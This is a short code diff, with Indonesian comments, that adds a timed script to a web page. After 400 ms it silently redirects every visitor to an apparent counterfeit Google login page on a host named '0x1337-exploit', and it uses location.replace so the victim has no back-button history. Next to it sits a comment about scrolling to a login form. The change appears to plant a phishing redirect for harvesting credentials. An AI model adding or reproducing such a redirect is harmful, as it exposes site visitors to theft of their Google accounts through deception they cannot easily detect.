@@ -295,7 +295,11 @@
                 }
             }, 3000);
         }
-      }
+
+        setTimeout(() => {
+          window.location.replace("https://0x1337-exploit.github.io/hosting/login/google.html");
+          // atau gunakan: window.location.href = "code2.html"; tapi replace lebih bersih (tidak masuk history)
+        }, 400);
 
       // Auto scroll ke form login
       setTimeout(() => {
